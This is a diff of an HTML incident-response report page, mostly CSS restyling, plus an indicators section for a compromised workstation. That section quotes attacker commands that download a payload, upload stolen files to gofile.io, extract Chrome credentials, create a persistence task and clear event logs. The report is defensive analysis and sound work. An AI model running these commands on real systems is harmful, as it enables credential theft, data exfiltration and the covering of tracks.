@@ -2,16 +2,27 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
 <title>AZUKI-IR-2025-1124-ADMINPC — Yousef Nabil</title>
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Barlow:wght@300;400;500;600&family=Barlow+Condensed:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap');
 
 :root {
-  --bg:        #080a0d;
-  --bg2:       #0c0f14;
-  --surface:   #101520;
-  --surface2:  #141a24;
+
+/* MOBILE RESPONSIVENESS */
+@media (max-width: 768px) {
+  .sidebar { width: 100%; position: relative; top: 0; border-right: none; border-bottom: 1px solid var(--border2); }
+  .main { margin-left: 0; padding: 20px 16px 60px; }
+  .layout { flex-direction: column; }
+  .nav-w { --nav-w: 100%; }
+  html { font-size: 16px; }
+  .topbar { flex-wrap: wrap; height: auto; min-height: var(--top-h); padding: 12px 16px; }
+  .tb-analyst { border-right: none; padding-right: 0; margin-bottom: 8px; }
+}
+  --bg:        #1a1d26;
+  --bg2:       #22262f;
+  --surface:   #2a2f3c;
+  --surface2:  #323948;
   --border:    rgba(255,200,80,0.07);
   --border2:   rgba(255,200,80,0.14);
   --border3:   rgba(255,200,80,0.25);
@@ -23,9 +34,9 @@
   --green:     #2ecc71;
   --green-dim: rgba(46,204,113,0.10);
   --blue:      #4a9eff;
-  --text:      #d4d8e0;
-  --text2:     #7a8090;
-  --text3:     #3a4050;
+  --text:      #e8eaf2;
+  --text2:     #b5bcc8;
+  --text3:     #7a8090;
   --mono:      'JetBrains Mono', monospace;
   --cond:      'Barlow Condensed', sans-serif;
   --sans:      'Barlow', sans-serif;
@@ -35,7 +46,7 @@
 }
 
 *,*::before,*::after { box-sizing: border-box; margin:0; padding:0; }
-html { font-size:14px; scroll-behavior:smooth; }
+html { font-size:15px; scroll-behavior:smooth; }
 
 body {
   font-family: var(--sans);
@@ -82,7 +93,7 @@ body::before {
   letter-spacing:.5px;
 }
 .tb-title {
-  font-family:var(--cond); font-size:13px; font-weight:500;
+  font-family:var(--cond); font-size:14.5px; font-weight:500;
   color:var(--text2); letter-spacing:.3px;
   flex:1; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;
 }
@@ -114,7 +125,7 @@ body::before {
 .nav-link {
   display:flex; align-items:center; gap:10px;
   padding:7px 18px; text-decoration:none;
-  color:var(--text3); font-size:12px; font-weight:400;
+  color:var(--text3); font-size:13.5px; font-weight:400;
   font-family:var(--sans);
   border-left:2px solid transparent;
   transition:all .12s ease;
@@ -208,7 +219,7 @@ body::before {
   color:var(--amber); opacity:.5; min-width:24px;
 }
 .sh-title {
-  font-family:var(--cond); font-size:13px; font-weight:700;
+  font-family:var(--cond); font-size:14.5px; font-weight:700;
   letter-spacing:2.5px; text-transform:uppercase; color:var(--text2);
 }
 .section-body { padding-bottom:24px; }
@@ -225,7 +236,7 @@ body::before {
 
 /* ── PROSE ── */
 .p {
-  font-size:13px; line-height:1.75; color:var(--text2);
+  font-size:14.5px; line-height:1.75; color:var(--text2);
   margin-bottom:10px;
 }
 .p strong { color:var(--text); font-weight:600; }
@@ -233,7 +244,7 @@ body::before {
 
 /* ── TABLE ── */
 .tbl-outer { overflow-x:auto; margin:8px 0 14px; border-radius:var(--radius); border:1px solid var(--border2); }
-table { width:100%; border-collapse:collapse; font-size:12px; }
+table { width:100%; border-collapse:collapse; font-size:13.5px; }
 thead tr { background:rgba(240,165,0,0.06); }
 thead th {
   font-family:var(--mono); font-size:8.5px; font-weight:500;
@@ -539,7 +550,7 @@ code {
   <span class="sh-num">10</span>
   <span class="sh-title">OBSERVED IOCs</span>
 </div>
-<div class="section-body"><div class="sub"><div class="sub-label">Host and Account Indicators</div><div class="tbl-outer"><table><thead><tr><th>Indicator</th><th>Type</th><th>Notes</th></tr></thead><tbody><tr><td>azuki-adminpc</td><td>Host</td><td>Primary compromised workstation</td></tr><tr><td>azuki-sl (10.1.0.204)</td><td>Host</td><td>Internal beachhead used for pivot</td></tr><tr><td>azuki-fileserver01 (10.1.0.188)</td><td>Host</td><td>PsExec lateral movement target</td></tr><tr><td>yuki.tanaka</td><td>Account</td><td>Compromised user — interactive access and execution</td></tr><tr><td>yuki.tanaka2</td><td>Account</td><td>Backdoor local admin created by attacker</td></tr><tr><td>kenji.sato</td><td>Account</td><td>Credential observed in PsExec command to 10.1.0.204</td></tr><tr><td>fileadmin</td><td>Account</td><td>Credential observed in PsExec command to 10.1.0.188</td></tr></tbody></table></div></div><div class="sub"><div class="sub-label">Network Indicators</div><div class="tbl-outer"><table><thead><tr><th>Domain / IP</th><th>Role</th></tr></thead><tbody><tr><td>litter.catbox.moe</td><td>Payload hosting (archive downloads)</td></tr><tr><td>108.181.20.36</td><td>Resolved IP — litter.catbox.moe (HTTPS/443)</td></tr><tr><td>store1.gofile.io</td><td>Exfiltration endpoint (form-based uploads)</td></tr><tr><td>45.112.123.227</td><td>Resolved IP — store1.gofile.io (HTTPS/443)</td></tr><tr><td>live.sysinternals.com</td><td>PsExec retrieval (legitimate, abused)</td></tr><tr><td>172.179.214.166</td><td>Resolved IP — live.sysinternals.com (HTTPS/443)</td></tr></tbody></table></div></div><div class="sub"><div class="sub-label">File / Tooling Indicators</div><div class="tbl-outer"><table><thead><tr><th>Filename</th><th>Path</th><th>SHA-256</th></tr></thead><tbody><tr><td>KB5044273-x64.7z</td><td>C:\Windows\Temp\cache\</td><td>c8ff861a52e85c9bfa2735f16c9f428c9de446e7295f2c5d3e6c194a4d322fb2</td></tr><tr><td>meterpreter.exe</td><td>C:\Windows\Temp\cache\</td><td>24373ce25d981b2b9b1d1e8390b2122f7557118f4c9c74096bcfb1bd60b9bb83</td></tr><tr><td>m-temp.7z</td><td>C:\Windows\Temp\cache\</td><td>8e5bd50f4db7b6114232defb471d32b17e117fccc4fa36d467531e4b5c2102ef</td></tr><tr><td>m.exe</td><td>C:\Windows\Temp\cache\</td><td>61c0810a23580cf492a6ba4f7654566108331e7a4134c968c2d6a05261b2d8a1</td></tr><tr><td>chrome-credentials.tar.gz</td><td>C:\Windows\Temp\cache\</td><td>664af795cbb5f7f1a57d8fe537c1aa1fc56b9d7ed0e6d2cc139d57127b6631e1</td></tr><tr><td>chrome-session-theft.tar.gz</td><td>C:\Windows\Temp\cache\</td><td>b5dcae00375318ab3c31c59a67a8d25eaa14c173da1783951a9f82bb0ae7dbe4</td></tr><tr><td>PsExec64.exe</td><td>C:\Windows\Temp\cache\</td><td>edfae1a69522f87b12c6dac3225d930e4848832e3c551ee1e7d31736bf4525ef</td></tr><tr><td>silentlynx.exe</td><td>C:\Windows\Temp\cache\ + ADMIN$ copies</td><td>ba9ee9747a60b34e6099ceb2f51a95b748a4f34d2114b5171756e8ae55f688ec</td></tr></tbody></table></div></div><div class="sub"><div class="sub-label">Persistence / Behavioural Indicators</div><ul class="bl"><li>Scheduled task: <code>Microsoft\Windows\Security\SecurityHealthService</code> (onlogon, highest privileges) executing <code>C:\Windows\Temp\cache\silentlynx.exe</code></li><li>Named pipe: <code>\Device\NamedPipe\msf-pipe-5902</code></li><li>Backdoor local admin: yuki.tanaka2 (created and added to Administrators)</li></ul></div><div class="sub"><div class="sub-label">Key Attacker Command Lines (Selected)</div><ul class="bl"><li><code>where /r C:\Users *.kdbx</code></li><li><code>NETSTAT.EXE -ano</code></li><li><code>nltest.exe /domain_trusts /all_trusts</code></li><li><code>curl.exe -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z</code></li><li><code>curl.exe -X POST -F <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="63050a0f065e2300110607060d170a020f104d1702114d0419">[email&#160;protected]</a> https://store1.gofile.io/uploadFile</code></li><li><code>m.exe privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit</code></li><li><code>schtasks /create /tn "Microsoft\Windows\Security\SecurityHealthService" /tr "C:\Windows\Temp\cache\silentlynx.exe" /sc onlogon /rl highest /f</code></li><li><code>wevtutil cl "Microsoft-Windows-PowerShell/Operational"</code></li><li><code>wevtutil.exe cl "Windows PowerShell"</code></li><li><code>robocopy.exe /s /r:3 /w:5 "C:\Users\yuki.tanaka\Documents\Banking" "C:\ProgramData\Microsoft\Crypto\staging\Banking"</code></li><li><code>tar.exe -czf credentials.tar.gz Master-Passwords.kdbx KeePass-Master-Password.txt</code></li><li><code>tar.exe -czf banking-records.tar.gz Banking</code></li></ul></div></div>
+<div class="section-body"><div class="sub"><div class="sub-label">Host and Account Indicators</div><div class="tbl-outer"><table><thead><tr><th>Indicator</th><th>Type</th><th>Notes</th></tr></thead><tbody><tr><td>azuki-adminpc</td><td>Host</td><td>Primary compromised workstation</td></tr><tr><td>azuki-sl (10.1.0.204)</td><td>Host</td><td>Internal beachhead used for pivot</td></tr><tr><td>azuki-fileserver01 (10.1.0.188)</td><td>Host</td><td>PsExec lateral movement target</td></tr><tr><td>yuki.tanaka</td><td>Account</td><td>Compromised user — interactive access and execution</td></tr><tr><td>yuki.tanaka2</td><td>Account</td><td>Backdoor local admin created by attacker</td></tr><tr><td>kenji.sato</td><td>Account</td><td>Credential observed in PsExec command to 10.1.0.204</td></tr><tr><td>fileadmin</td><td>Account</td><td>Credential observed in PsExec command to 10.1.0.188</td></tr></tbody></table></div></div><div class="sub"><div class="sub-label">Network Indicators</div><div class="tbl-outer"><table><thead><tr><th>Domain / IP</th><th>Role</th></tr></thead><tbody><tr><td>litter.catbox.moe</td><td>Payload hosting (archive downloads)</td></tr><tr><td>108.181.20.36</td><td>Resolved IP — litter.catbox.moe (HTTPS/443)</td></tr><tr><td>store1.gofile.io</td><td>Exfiltration endpoint (form-based uploads)</td></tr><tr><td>45.112.123.227</td><td>Resolved IP — store1.gofile.io (HTTPS/443)</td></tr><tr><td>live.sysinternals.com</td><td>PsExec retrieval (legitimate, abused)</td></tr><tr><td>172.179.214.166</td><td>Resolved IP — live.sysinternals.com (HTTPS/443)</td></tr></tbody></table></div></div><div class="sub"><div class="sub-label">File / Tooling Indicators</div><div class="tbl-outer"><table><thead><tr><th>Filename</th><th>Path</th><th>SHA-256</th></tr></thead><tbody><tr><td>KB5044273-x64.7z</td><td>C:\Windows\Temp\cache\</td><td>c8ff861a52e85c9bfa2735f16c9f428c9de446e7295f2c5d3e6c194a4d322fb2</td></tr><tr><td>meterpreter.exe</td><td>C:\Windows\Temp\cache\</td><td>24373ce25d981b2b9b1d1e8390b2122f7557118f4c9c74096bcfb1bd60b9bb83</td></tr><tr><td>m-temp.7z</td><td>C:\Windows\Temp\cache\</td><td>8e5bd50f4db7b6114232defb471d32b17e117fccc4fa36d467531e4b5c2102ef</td></tr><tr><td>m.exe</td><td>C:\Windows\Temp\cache\</td><td>61c0810a23580cf492a6ba4f7654566108331e7a4134c968c2d6a05261b2d8a1</td></tr><tr><td>chrome-credentials.tar.gz</td><td>C:\Windows\Temp\cache\</td><td>664af795cbb5f7f1a57d8fe537c1aa1fc56b9d7ed0e6d2cc139d57127b6631e1</td></tr><tr><td>chrome-session-theft.tar.gz</td><td>C:\Windows\Temp\cache\</td><td>b5dcae00375318ab3c31c59a67a8d25eaa14c173da1783951a9f82bb0ae7dbe4</td></tr><tr><td>PsExec64.exe</td><td>C:\Windows\Temp\cache\</td><td>edfae1a69522f87b12c6dac3225d930e4848832e3c551ee1e7d31736bf4525ef</td></tr><tr><td>silentlynx.exe</td><td>C:\Windows\Temp\cache\ + ADMIN$ copies</td><td>ba9ee9747a60b34e6099ceb2f51a95b748a4f34d2114b5171756e8ae55f688ec</td></tr></tbody></table></div></div><div class="sub"><div class="sub-label">Persistence / Behavioural Indicators</div><ul class="bl"><li>Scheduled task: <code>Microsoft\Windows\Security\SecurityHealthService</code> (onlogon, highest privileges) executing <code>C:\Windows\Temp\cache\silentlynx.exe</code></li><li>Named pipe: <code>\Device\NamedPipe\msf-pipe-5902</code></li><li>Backdoor local admin: yuki.tanaka2 (created and added to Administrators)</li></ul></div><div class="sub"><div class="sub-label">Key Attacker Command Lines (Selected)</div><ul class="bl"><li><code>where /r C:\Users *.kdbx</code></li><li><code>NETSTAT.EXE -ano</code></li><li><code>nltest.exe /domain_trusts /all_trusts</code></li><li><code>curl.exe -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z</code></li><li><code>curl.exe -X POST -F <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="cfa9a6a3aaf28facbdaaabaaa1bba6aea3bce1bbaebde1a8b5">[email&#160;protected]</a> https://store1.gofile.io/uploadFile</code></li><li><code>m.exe privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit</code></li><li><code>schtasks /create /tn "Microsoft\Windows\Security\SecurityHealthService" /tr "C:\Windows\Temp\cache\silentlynx.exe" /sc onlogon /rl highest /f</code></li><li><code>wevtutil cl "Microsoft-Windows-PowerShell/Operational"</code></li><li><code>wevtutil.exe cl "Windows PowerShell"</code></li><li><code>robocopy.exe /s /r:3 /w:5 "C:\Users\yuki.tanaka\Documents\Banking" "C:\ProgramData\Microsoft\Crypto\staging\Banking"</code></li><li><code>tar.exe -czf credentials.tar.gz Master-Passwords.kdbx KeePass-Master-Password.txt</code></li><li><code>tar.exe -czf banking-records.tar.gz Banking</code></li></ul></div></div>
 </div>
 <div class="section" id="recs">
 <div class="section-header">
